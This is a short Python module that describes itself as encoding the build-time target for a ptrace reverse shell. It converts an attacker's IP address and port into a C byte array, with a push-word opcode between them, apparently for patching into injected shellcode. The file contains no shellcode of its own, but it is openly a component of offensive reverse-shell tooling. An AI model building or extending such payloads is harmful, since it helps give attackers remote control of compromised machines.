"""Encodes the ptrace reverse shell's build-time target."""

from __future__ import annotations

import socket
import struct

_PUSHW_OPCODE = bytes.fromhex("6668")  # fixed bytes between the IP and port


def target_hex(ip: str, port: int) -> str:
    """Return the C byte sequence for the target IP and network-order port."""
    data = socket.inet_aton(ip) + _PUSHW_OPCODE + struct.pack(">H", port)
    return ",".join(f"0x{byte:02x}" for byte in data)
